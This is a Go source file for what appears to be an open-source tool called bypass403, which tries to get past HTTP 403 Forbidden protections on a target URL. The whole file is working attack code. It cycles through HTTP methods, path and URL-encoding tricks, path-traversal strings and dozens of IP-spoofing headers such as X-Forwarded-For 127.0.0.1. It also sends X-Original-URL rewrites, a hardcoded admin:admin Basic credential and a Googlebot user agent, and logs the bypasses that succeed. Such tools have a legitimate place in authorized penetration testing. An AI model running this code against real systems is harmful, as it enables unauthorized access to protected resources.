package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type BypassResult struct {
	URL        string
	StatusCode int
	Method     string
	Technique  string
}

var techniques = []struct {
	Name     string
	Test     func(baseURL string, client *http.Client) ([]BypassResult, error)
	Category string
}{
	{"Method Manipulation", testMethodManipulation, "Request Method"},
	{"URL Path Manipulation", testURLPathManipulation, "URL Path"},
	{"Header Manipulation", testHeaderManipulation, "Headers"},
	{"IP Spoofing Headers", testIPSpoofingHeaders, "IP Spoofing"},
	{"URL Encoding Bypass", testURLEncodingBypass, "URL Encoding"},
	{"Protocol Bypass", testProtocolBypass, "Protocol"},
	{"Path Traversal", testPathTraversal, "Path Traversal"},
	{"Caching Proxy Bypass", testCachingProxyBypass, "Proxy"},
	{"Advanced Payloads", testAdvancedPayloads, "Advanced"},
	{"Wordlist Path Bypass", testWordlistPathBypass, "Wordlist"},
	{"Combined Technique Bypass", testCombinedBypass, "Combined"},
}

var (
	url403        string
	threads       int
	output        string
	timeout       int
	verbose       bool
	allTechniques bool
	category      string
	userAgent     string
	wordlistPath  string
)

func main() {
	// Print banner
	printBanner()

	flag.StringVar(&url403, "u", "", "URL that returns 403 Forbidden")
	flag.IntVar(&threads, "t", 10, "Number of concurrent threads")
	flag.StringVar(&output, "o", "", "Output file to save results")
	flag.IntVar(&timeout, "timeout", 10, "HTTP request timeout in seconds")
	flag.BoolVar(&verbose, "v", false, "Verbose mode")
	flag.BoolVar(&allTechniques, "all", false, "Try all bypass techniques")
	flag.StringVar(&category, "c", "", "Category of bypass techniques to try (Method, Path, Headers, IP, Encoding, Protocol, Traversal, Proxy, Advanced)")
	flag.StringVar(&userAgent, "ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", "User-Agent to use")
	flag.StringVar(&wordlistPath, "w", "payloads/bypasses.txt", "Path to wordlist file for bypass attempts")
	flag.Parse()

	if url403 == "" {
		fmt.Println("403Bypass - A tool to bypass 403 Forbidden responses")
		fmt.Println("Usage: bypass403 -u https://example.com/forbidden")
		fmt.Println("\nOptions:")
		flag.PrintDefaults()
		fmt.Println("\nExamples:")
		fmt.Println("  bypass403 -u https://example.com/admin -v -o results.txt")
		fmt.Println("  bypass403 -u https://example.com/admin -w payloads/bypasses.txt -all")
		fmt.Println("\nNote: Successful bypasses are automatically saved to forbidden_bypass.txt")
		os.Exit(1)
	}

	// Validate URL
	_, err := url.Parse(url403)
	if err != nil {
		fmt.Printf("Error: Invalid URL: %s\n", err)
		os.Exit(1)
	}

	// Create HTTP client with custom settings
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Allow up to 10 redirects
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	// First, check if the URL actually returns 403
	req, _ := http.NewRequest("GET", url403, nil)
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error: Could not connect to URL: %s\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 403 {
		fmt.Printf("Warning: The provided URL returns %d, not 403 Forbidden. Continue anyway? (y/n): ", resp.StatusCode)
		var answer string
		fmt.Scanln(&answer)
		if strings.ToLower(answer) != "y" {
			os.Exit(0)
		}
	}

	fmt.Printf("Starting 403 bypass attempts on %s\n", url403)
	fmt.Println("============================================")

	// Setup concurrency handling
	var wg sync.WaitGroup
	resultChan := make(chan BypassResult)
	semaphore := make(chan struct{}, threads)

	// Process results in background
	var successfulResults []BypassResult
	go func() {
		for result := range resultChan {
			if result.StatusCode != 403 && result.StatusCode != 0 && result.StatusCode != 404 {
				fmt.Printf("[+] BYPASS FOUND! %s (%d) - Technique: %s/%s\n",
					result.URL, result.StatusCode, result.Technique, result.Method)
				successfulResults = append(successfulResults, result)

				// Save successful bypass to separate file
				err := saveForbiddenBypass(result.URL)
				if err != nil && verbose {
					fmt.Printf("Warning: Could not save bypass to file: %s\n", err)
				}
			} else if verbose {
				fmt.Printf("[-] Failed: %s (%d) - Technique: %s/%s\n",
					result.URL, result.StatusCode, result.Technique, result.Method)
			}
		}
	}()

	// Run selected techniques
	for _, technique := range techniques {
		if shouldRunTechnique(technique.Category) {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore

			go func(t struct {
				Name     string
				Test     func(string, *http.Client) ([]BypassResult, error)
				Category string
			}) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore

				if verbose {
					fmt.Printf("Trying %s techniques...\n", t.Name)
				}

				results, err := t.Test(url403, client)
				if err != nil && verbose {
					fmt.Printf("Error with %s technique: %s\n", t.Name, err)
				}

				for _, r := range results {
					resultChan <- r
				}
			}(technique)
		}
	}

	// Wait for all tests to complete
	wg.Wait()
	close(resultChan)

	// Summary
	fmt.Println("\n============= RESULTS =============")
	if len(successfulResults) > 0 {
		fmt.Printf("Found %d potential bypasses:\n", len(successfulResults))
		for i, r := range successfulResults {
			fmt.Printf("%d. %s (%d) - Technique: %s/%s\n",
				i+1, r.URL, r.StatusCode, r.Technique, r.Method)
		}

		// Save results to file if requested
		if output != "" {
			saveResultsToFile(successfulResults, output)
		}

		fmt.Println("\nSuccessful bypasses have been saved to forbidden_bypass.txt")
		fmt.Println("\nTips:")
		fmt.Println("* Try combined techniques for better results")
		fmt.Println("* Check each bypass manually to confirm access")
		fmt.Println("* Different status codes may indicate different levels of access")
		fmt.Println("* Consider using a custom wordlist with `-w` option")
	} else {
		fmt.Println("No bypasses found for the given URL.")
		fmt.Println("Try with different techniques or check if the protection can be bypassed.")
		fmt.Println("Consider using a custom wordlist with `-w` option or try the combined techniques category.")
	}
}

func shouldRunTechnique(techniqueCategory string) bool {
	if allTechniques {
		return true
	}

	if category == "" {
		return true
	}

	return strings.Contains(strings.ToLower(techniqueCategory), strings.ToLower(category))
}

func testMethodManipulation(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	methods := []string{"GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "TRACE", "CONNECT", "PATCH", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "FAKE-METHOD"}

	for _, method := range methods {
		req, err := http.NewRequest(method, baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     method,
			Technique:  "Method Manipulation",
		})
	}

	return results, nil
}

func testURLPathManipulation(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	originalPath := parsedURL.Path
	pathManipulations := []string{
		originalPath + "/",
		originalPath + "//",
		originalPath + "/..",
		originalPath + "/./",
		originalPath + "%2f",
		originalPath + "%2e",
		originalPath + "%252f",
		"//" + parsedURL.Host + originalPath,
		"/" + originalPath,
		originalPath + "/;",
		originalPath + "..;/",
		originalPath + ".json",
		originalPath + ".html",
		originalPath + ".php",
		originalPath + "%20",
		originalPath + "%09",
		originalPath + "~",
	}

	for _, path := range pathManipulations {
		manipulatedURL := *parsedURL
		manipulatedURL.Path = path

		req, err := http.NewRequest("GET", manipulatedURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        manipulatedURL.String(),
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "URL Path Manipulation",
		})
	}

	return results, nil
}

func testHeaderManipulation(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult

	headerManipulations := []struct {
		Header string
		Value  string
	}{
		{"X-Original-URL", "/"},
		{"X-Rewrite-URL", "/"},
		{"X-Override-URL", "/"},
		{"X-Custom-IP-Authorization", "127.0.0.1"},
		{"Referer", baseURL},
		{"X-Originating-IP", "127.0.0.1"},
		{"Authorization", "Basic YWRtaW46YWRtaW4="},
		{"Content-Length", "0"},
		{"X-Original-URL", "/admin"},
		{"X-Rewrite-URL", "/admin"},
	}

	// Extract path from URL
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	for _, headerM := range headerManipulations {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)
		req.Header.Set(headerM.Header, headerM.Value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Header: " + headerM.Header,
		})
	}

	return results, nil
}

func testIPSpoofingHeaders(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult

	ipHeaders := []struct {
		Header string
		Value  string
	}{
		{"X-Forwarded-For", "127.0.0.1"},
		{"X-Forwarded-Host", "127.0.0.1"},
		{"X-Host", "127.0.0.1"},
		{"X-Custom-IP-Authorization", "127.0.0.1"},
		{"X-Originating-IP", "127.0.0.1"},
		{"X-Remote-IP", "127.0.0.1"},
		{"X-Client-IP", "127.0.0.1"},
		{"X-Real-IP", "127.0.0.1"},
		{"X-Forwarded", "127.0.0.1"},
		{"Forwarded-For", "127.0.0.1"},
		{"X-ProxyUser-IP", "127.0.0.1"},
		{"Via", "1.1 127.0.0.1"},
		{"Client-IP", "127.0.0.1"},
		{"True-Client-IP", "127.0.0.1"},
		{"Cluster-Client-IP", "127.0.0.1"},
		{"X-Forwarded-For", "localhost"},
		{"X-Forwarded-For", "10.0.0.1"},
		{"X-Forwarded-For", "192.168.1.1"},
		{"X-Forwarded-For", "127.0.0.1, 127.0.0.2"},
		{"X-Originally-Forwarded-For", "127.0.0.1"},
		{"X-Forwarded-For", "http://127.0.0.1"},
		{"X-Forwarded-For", "127.0.0.1:80"},
		{"X-Originating", "http://127.0.0.1"},
		{"X-WAP-Profile", "127.0.0.1"},
		{"X-Arbitrary", "http://127.0.0.1"},
		{"X-HTTP-DestinationURL", "http://127.0.0.1"},
		{"X-Forwarded-Proto", "http://127.0.0.1"},
		{"Destination", "127.0.0.1"},
		{"X-Client-IP", "http://127.0.0.1"},
		{"X-Host", "http://127.0.0.1"},
		{"X-Forwarded-Host", "http://127.0.0.1"},
		{"X-Forwarded-Port", "4443"},
		{"X-Forwarded-Port", "80"},
		{"X-Forwarded-Port", "8080"},
		{"X-Forwarded-Port", "8443"},
		{"X-ProxyUser-Ip", "127.0.0.1"},
		{"X-Original-URL", "/admin"},
		{"X-Rewrite-URL", "/admin"},
		{"X-Originating-URL", "/admin"},
		{"X-Forwarded-Server", "localhost"},
		{"X-Forwarded-Scheme", "http"},
		{"X-Original-Remote-Addr", "127.0.0.1"},
		{"X-Forwarded-Protocol", "http"},
		{"X-Original-Host", "localhost"},
		{"Proxy-Host", "localhost"},
		{"Request-Uri", "/admin"},
		{"X-Server-IP", "127.0.0.1"},
		{"X-Forwarded-SSL", "off"},
		{"X-Original-URL", "127.0.0.1"},
		{"X-Client-Port", "443"},
		{"X-Backend-Host", "localhost"},
		{"X-Remote-Addr", "127.0.0.1"},
		{"X-Remote-Port", "443"},
		{"X-Host-Override", "localhost"},
		{"X-Forwarded-Server", "localhost:80"},
		{"X-Host-Name", "localhost"},
		{"X-Proxy-URL", "http://127.0.0.1"},
		{"Base-Url", "http://127.0.0.1"},
		{"HTTP-X-Forwarded-For", "127.0.0.1"},
		{"HTTP-Client-IP", "127.0.0.1"},
		{"HTTP-X-Real-IP", "127.0.0.1"},
		{"Proxy-Url", "http://127.0.0.1"},
		{"X-Forward-For", "127.0.0.1"},
		{"X-Forwarded", "127.0.0.1"},
		{"Forwarded-For-Ip", "127.0.0.1"},
		{"X-Forwarded-By", "127.0.0.1"},
		{"X-Forwarded-For-Original", "127.0.0.1"},
		{"X-Forwarded-Host-Original", "localhost"},
		{"X-Pwnage", "127.0.0.1"},
		{"X-Bypass", "127.0.0.1"},
	}

	for _, ipHeader := range ipHeaders {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)
		req.Header.Set(ipHeader.Header, ipHeader.Value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "IP Spoofing: " + ipHeader.Header,
		})
	}

	return results, nil
}

func testURLEncodingBypass(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	originalPath := parsedURL.Path
	encodedPaths := []string{
		strings.ReplaceAll(originalPath, "/", "%2f"),
		strings.ReplaceAll(originalPath, "/", "%252f"),
		strings.ReplaceAll(originalPath, "/", "%2F"),
		strings.ReplaceAll(originalPath, "a", "%61"),
		strings.ReplaceAll(originalPath, "A", "%41"),
		strings.ReplaceAll(originalPath, "s", "%73"),
		strings.ReplaceAll(originalPath, "S", "%53"),
	}

	for _, path := range encodedPaths {
		manipulatedURL := *parsedURL
		manipulatedURL.Path = path

		req, err := http.NewRequest("GET", manipulatedURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        manipulatedURL.String(),
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "URL Encoding",
		})
	}

	return results, nil
}

func testProtocolBypass(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	// Try different protocols
	protocols := []string{"http://", "https://"}

	for _, protocol := range protocols {
		if strings.HasPrefix(baseURL, protocol) {
			// Skip current protocol
			continue
		}

		manipulatedURL := protocol + parsedURL.Host + parsedURL.Path
		if parsedURL.RawQuery != "" {
			manipulatedURL += "?" + parsedURL.RawQuery
		}

		req, err := http.NewRequest("GET", manipulatedURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        manipulatedURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Protocol Change",
		})
	}

	return results, nil
}

func testPathTraversal(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	// Extract base directory and append target
	paths := strings.Split(parsedURL.Path, "/")
	var targetPath string
	if len(paths) > 0 {
		targetPath = paths[len(paths)-1]
	}

	traversals := []string{
		"..;/" + targetPath,
		"../;" + targetPath,
		"..%2f" + targetPath,
		"..%252f" + targetPath,
		".%2e/" + targetPath,
		"..%00/" + targetPath,
		"..%0d/" + targetPath,
		"..%5c" + targetPath,
		"/..%2f" + targetPath,
	}

	for _, traversal := range traversals {
		manipulatedURL := *parsedURL
		manipulatedURL.Path = traversal

		req, err := http.NewRequest("GET", manipulatedURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        manipulatedURL.String(),
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Path Traversal",
		})
	}

	return results, nil
}

func testCachingProxyBypass(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult

	proxyHeaders := []struct {
		Header string
		Value  string
	}{
		{"X-Host", parseDomain(baseURL)},
		{"X-Forwarded-Server", parseDomain(baseURL)},
		{"Cache-Control", "no-transform"},
		{"Pragma", "no-cache"},
		{"X-Cache-Key", baseURL},
		{"If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"},
		{"If-None-Match", "\"12345\""},
	}

	for _, header := range proxyHeaders {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)
		req.Header.Set(header.Header, header.Value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Proxy Cache: " + header.Header,
		})
	}

	return results, nil
}

func testAdvancedPayloads(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	// Advanced techniques
	advancedPayloads := []struct {
		Path      string
		Method    string
		Headers   map[string]string
		Technique string
	}{
		{
			Path:      parsedURL.Path + "?",
			Method:    "GET",
			Headers:   nil,
			Technique: "Query Parameter Confusion",
		},
		{
			Path:      parsedURL.Path + "#admin",
			Method:    "GET",
			Headers:   nil,
			Technique: "URL Fragment",
		},
		{
			Path:      parsedURL.Path + "%",
			Method:    "GET",
			Headers:   nil,
			Technique: "URL Parsing",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"Referer":    "https://www.google.com/",
				"Connection": "close",
			},
			Technique: "Google Referrer",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
			},
			Technique: "Googlebot User-Agent",
		},
		{
			Path:   parsedURL.Path,
			Method: "GET",
			Headers: map[string]string{
				"X-CSRF-Token": "",
				"X-API-Key":    "",
			},
			Technique: "Empty Security Headers",
		},
	}

	for _, payload := range advancedPayloads {
		manipulatedURL := *parsedURL
		manipulatedURL.Path = payload.Path

		req, err := http.NewRequest(payload.Method, manipulatedURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)
		if payload.Headers != nil {
			for header, value := range payload.Headers {
				req.Header.Set(header, value)
			}
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        manipulatedURL.String(),
			StatusCode: resp.StatusCode,
			Method:     payload.Method,
			Technique:  "Advanced: " + payload.Technique,
		})
	}

	return results, nil
}

func testWordlistPathBypass(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	// Load wordlist
	payloads, err := loadWordlist(wordlistPath)
	if err != nil {
		if verbose {
			fmt.Printf("Warning: Could not load wordlist: %s\n", err)
		}
		// Return empty results but don't break execution
		return results, nil
	}

	baseDir := filepath.Dir(parsedURL.Path)
	if baseDir == "." || baseDir == "/" {
		baseDir = ""
	}

	for _, payload := range payloads {
		// Try with base path + payload
		manipulatedURL := *parsedURL
		manipulatedURL.Path = filepath.Join(baseDir, payload)

		req, err := http.NewRequest("GET", manipulatedURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, BypassResult{
			URL:        manipulatedURL.String(),
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Wordlist Path: " + payload,
		})

		// If we found a successful bypass and it's not a GET request, try with POST too
		if resp.StatusCode != 403 && resp.StatusCode != 404 {
			postReq, err := http.NewRequest("POST", manipulatedURL.String(), nil)
			if err != nil {
				continue
			}

			postReq.Header.Set("User-Agent", userAgent)
			postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			postResp, err := client.Do(postReq)
			if err != nil {
				continue
			}
			postResp.Body.Close()

			results = append(results, BypassResult{
				URL:        manipulatedURL.String(),
				StatusCode: postResp.StatusCode,
				Method:     "POST",
				Technique:  "Wordlist Path: " + payload,
			})
		}
	}

	return results, nil
}

func testCombinedBypass(baseURL string, client *http.Client) ([]BypassResult, error) {
	var results []BypassResult
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}

	// Load wordlist
	payloads, err := loadWordlist(wordlistPath)
	if err != nil {
		if verbose {
			fmt.Printf("Warning: Could not load wordlist for combined bypasses: %s\n", err)
		}
		// Continue with default payloads
		payloads = []string{"/", "//", "/./", "/%2e/", "/%20"}
	}

	// Headers to try
	headers := []map[string]string{
		{"X-Forwarded-For": "127.0.0.1"},
		{"X-Custom-IP-Authorization": "127.0.0.1"},
		{"X-Original-URL": "/admin"},
		{"X-Rewrite-URL": "/admin"},
		{"X-Forwarded-Host": "127.0.0.1"},
		{"X-Host": "127.0.0.1"},
		{"X-Remote-IP": "127.0.0.1"},
	}

	// Methods to try
	methods := []string{"GET", "POST", "HEAD", "OPTIONS"}

	// Combined tests
	for _, payload := range payloads {
		for _, header := range headers {
			for _, method := range methods {
				manipulatedURL := *parsedURL
				// Apply path manipulation
				manipulatedURL.Path = filepath.Join(filepath.Dir(manipulatedURL.Path), payload)

				req, err := http.NewRequest(method, manipulatedURL.String(), nil)
				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", userAgent)

				// Apply headers
				for key, value := range header {
					req.Header.Set(key, value)
				}

				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				resp.Body.Close()

				headerNames := make([]string, 0)
				for key := range header {
					headerNames = append(headerNames, key)
				}

				results = append(results, BypassResult{
					URL:        manipulatedURL.String(),
					StatusCode: resp.StatusCode,
					Method:     method,
					Technique:  "Combined: " + strings.Join(headerNames, "+") + " + " + payload,
				})
			}
		}
	}

	return results, nil
}

func parseDomain(rawURL string) string {
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	return parsedURL.Host
}

// printBanner prints the tool banner
func printBanner() {
	banner := `███████████████████████████████████████████████████████████████████████████
█▄─▄─▀█▄─██─▄█▄─▄▄─██▀▄─██─▄▄▄▄█─▄▄▄▄███░█░█░█░█████▀▀█░█▀░█▀▄─█▀▀█░██▀▄─█
██─▄─▀██─██─███─▄▄▄██─▀─██▄▄▄▄─█▄▄▄▄─███▄█▄█▄███████░██▄█░█─▀─█▄▄█▀▄█─▀─█
█▄▄▄▄██▀▄▄▄▄██▄▄▄███▄▄▄▄██▄▄▄▄▄█▄▄▄▄▄███▄█▄█▄███████▄██▄█░█▄▄▄█▄▄█▄▄█▄▄▄█

  ▄████████  ▄█   ▄█▄   ▄▄▄▄▄▄▄▄   ▄████████ ███    █▄  
 ███    ███ ███  ███  ███    ███  ███    ███ ███    ███ 
 ███    █▀  ███▌ ███▌ ███    ███  ███    █▀  ███    ███ 
 ███        ███▌ ███▌ ███    ███ ▄███▄▄▄     ███    ███ 
▀███████████ ███▌ ███▌ ███    ███▀▀███▀▀▀     ███    ███ 
         ███ ███  ███  ███    ███  ███    █▄  ███    ███ 
   ▄█    ███ ███  ███  ███    ███  ███    ███ ███    ███ 
 ▄████████▀  █▀   █▀    ▀▀▀▀▀▀▀   ██████████ ████████▀  
                                                          
 ╔═══════════════════════════════════════════════════════╗
 ║         FORBIDDEN GATES SHALL FALL BEFORE ME          ║
 ║           github.com/ibrahimsql/bypass403            ║
 ╚═══════════════════════════════════════════════════════╝`

	fmt.Println(banner)
	fmt.Println()
}

func saveResultsToFile(results []BypassResult, filename string) {
	file, err := os.Create(filename)
	if err != nil {
		fmt.Printf("Error creating output file: %s\n", err)
		return
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	writer.WriteString("=== 403 Bypass Results ===\n")
	writer.WriteString(fmt.Sprintf("Target URL: %s\n", url403))
	writer.WriteString(fmt.Sprintf("Date: %s\n\n", time.Now().Format(time.RFC1123)))

	for i, r := range results {
		writer.WriteString(fmt.Sprintf("%d. %s (%d) - Technique: %s/%s\n",
			i+1, r.URL, r.StatusCode, r.Technique, r.Method))
	}

	writer.WriteString("\n=== Tips ===\n")
	writer.WriteString("1. Check all successful responses manually to confirm they provide actual access\n")
	writer.WriteString("2. Some bypasses might only provide partial access or different content\n")
	writer.WriteString("3. Combine multiple techniques for better results\n")

	writer.Flush()

	fmt.Printf("Results saved to %s\n", filename)
}

// loadWordlist loads a wordlist from a file
func loadWordlist(path string) ([]string, error) {
	var payloads []string

	// Check if the file exists
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil, fmt.Errorf("wordlist file not found: %s", path)
	}

	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			payloads = append(payloads, line)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return payloads, nil
}

// saveForbiddenBypass saves a successful bypass URL to a file
func saveForbiddenBypass(url string) error {
	file, err := os.OpenFile("forbidden_bypass.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	if _, err := file.WriteString(url + "\n"); err != nil {
		return err
	}

	return nil
}
